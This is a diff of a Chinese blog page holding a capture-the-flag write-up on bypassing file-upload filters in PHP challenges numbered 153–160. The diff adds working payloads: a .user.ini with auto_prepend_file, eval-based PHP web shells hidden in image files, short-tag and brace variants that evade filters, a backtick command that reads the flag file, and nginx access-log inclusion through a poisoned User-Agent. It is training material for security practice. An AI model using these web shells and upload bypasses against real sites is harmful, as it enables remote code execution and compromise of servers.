@@ -74,7 +74,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">394</span>
+            <span class="post-count">562</span>
         </span>
     </span>
 
@@ -83,7 +83,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> 阅读时长≈</span>
-            <span class="post-count">1 分钟</span>
+            <span class="post-count">2 分钟</span>
         </span>
     </span>
 </div>
@@ -110,7 +110,7 @@
 <p>尝试上传.user.ini,发现上传成功<br>
 <img src="https://img-blog.csdnimg.cn/2021011623593150.png" alt="在这里插入图片描述"></p>
 <p>文件内容:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file &#x3D; 1.php</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89</span><br><span class="line">auto_prepend_file &#x3D; 1.php</span><br></pre></td></tr></table></figure>
 <p>然后上传一张图片马,1.php<br>
 文件内容:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@eval($_POST[&#39;flag&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
@@ -128,20 +128,31 @@
 <p>大写绕过不行了</p>
 <p>尝试使用短标签绕过<br>
 对于php的标签其他写法有四种</p>
-<p>1、</p>
+<p>1、前提是开启配置参数short_open_tags=on</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;? echo &#39;123&#39;;?&gt;</span><br></pre></td></tr></table></figure>
-<p>前提是开启配置参数short_open_tags=on<br>
-2、</p>
+<p>2、 不需要开启参数设置</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?&#x3D;(表达式)?&gt;  等价于 &lt;?php echo (表达式)?&gt;</span><br></pre></td></tr></table></figure>
-<p>不需要开启参数设置</p>
-<p>3、</p>
+<p>3、前提是开启配置参数asp_tags=on，经过测试发现7.0及以上修改完之后也不能使用，而是报500错误，但是7.0以下版本在修改完配置后就可以使用了。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% echo &#39;123&#39;;%&gt;</span><br></pre></td></tr></table></figure>
-<p>前提是开启配置参数asp_tags=on，经过测试发现7.0及以上修改完之后也不能使用，而是报500错误，但是7.0以下版本在修改完配置后就可以使用了。<br>
-4、</p>
-<script language="php">echo '123'; </script>
-<p>不需要修改参数开关，但是只能在7.0以下可用。<br>
+<p>4、不需要修改参数开关，但是只能在7.0以下可用。<br>
 对于该题，我们可用使用<code>&lt;?=(表达式)?&gt;</code>进行绕过，图片内容 <code>&lt;?=eval($_POST[flag]);?&gt;</code><br>
 剩下的步骤同153</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;echo &#39;123&#39;; &lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="156"><a class="header-anchor" href="#156">¶</a>156</h2>
+<p>在前面的基础上过滤了 []那我们直接用{}来代替<br>
+图片马内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?&#x3D;eval($_POST&#123;1&#125;);?&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="157-159"><a class="header-anchor" href="#157-159">¶</a>157-159</h2>
+<p>直接将图片内容换成这个。。。算是投机取巧的方法吧  毕竟知道flag在哪里</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">aa.png</span><br><span class="line"></span><br><span class="line">&lt;?&#x3D;&#96;tac ..&#x2F;f*&#96;?&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="160"><a class="header-anchor" href="#160">¶</a>160</h2>
+<p>使用 日志包含</p>
+<p>过滤了括号反引号还有一些关键字<br>
+利用日志包含绕过，图片内容<?=include"/var/lo"."g/nginx/access.lo"."g"?>因为log被过滤了。所以用拼接绕过<br>
+上传完.user.ini和图片后<br>
+访问网站然后修改ua头信息</p>
+<p><img src="https://img-blog.csdnimg.cn/20210122154255213.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>接着访问/upload目录 就可</p>
  
       <!-- reward -->
       
@@ -316,7 +327,7 @@
     <ul>
       
         <li>
-          <a href="" target="_black" rel="nofollow">闽ICP备88888888</a>
+          <a href="" target="_black" rel="nofollow">闽ICP备2021001239号</a>
         </li>
         
     </ul>
